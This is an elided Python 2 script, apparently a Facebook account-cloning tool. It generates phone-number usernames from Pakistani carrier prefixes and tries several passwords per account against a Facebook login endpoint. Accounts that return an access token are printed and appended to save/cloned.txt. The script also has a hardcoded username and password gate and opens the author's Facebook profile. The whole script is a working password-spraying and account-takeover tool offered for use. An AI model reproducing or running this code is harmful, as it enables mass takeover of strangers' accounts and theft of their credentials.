...
\x1b[1;98m🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀🥀
"""
CorrectUsername = "RAXEELOX3"
CorrectPassword = "KHUSHI"
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
	    ...
	    time.sleep(2)
            ...
            os.system('xdg-open https://www.facebook.com/profile.php?id=100074082168109')
    else:
...
def pilih_login():
    peak = raw_input("\n\033[1;95mKHUSHI XE RAXEELO-᙭ᗪ➤ \033[1;93m")
    if peak =="":
...
def action():
    peak = raw_input('\n\033[1;97mKHUSHI XE RAXEELO-᙭ᗪ➤\033[1;97m')
    if peak =='':
        ...
        print '\x1b[1;92m[TELENOR]\x1b[1;91m[JAZZ]\x1b[1;93m[ZONG]\x1b[1;95m[UFUNE]'
        try:
            c = raw_input("\033[1;97mKHUSHI XE RAXEELO-᙭ᗪ➤")
            k="03"
            idlist = ('.txt')
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;95m(KHUSHI CP)  ' + k + c + user + '  |  ' + pass1                                       
                ...
                if 'www.facebook.com' in q['error_msg']:
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;91m(KHUSHI OK)  ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/cloned.txt', 'a')
                        ...
                        if 'www.facebook.com' in q['error_msg']:
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;93m(KHUSHI OK)  ' + k + c + user + '  |  ' + pass3
                                okb = open('save/cloned.txt', 'a')
                                ...
                                if 'www.facebook.com' in q['error_msg']:
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;93m(KHUSHI OK)  ' + k + c + user + '  |  ' + pass4 
                                        okb = open('save/cloned.txt', 'a')
    ...
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Khushi Xe Raxeelo Process Has Been Completed ...'
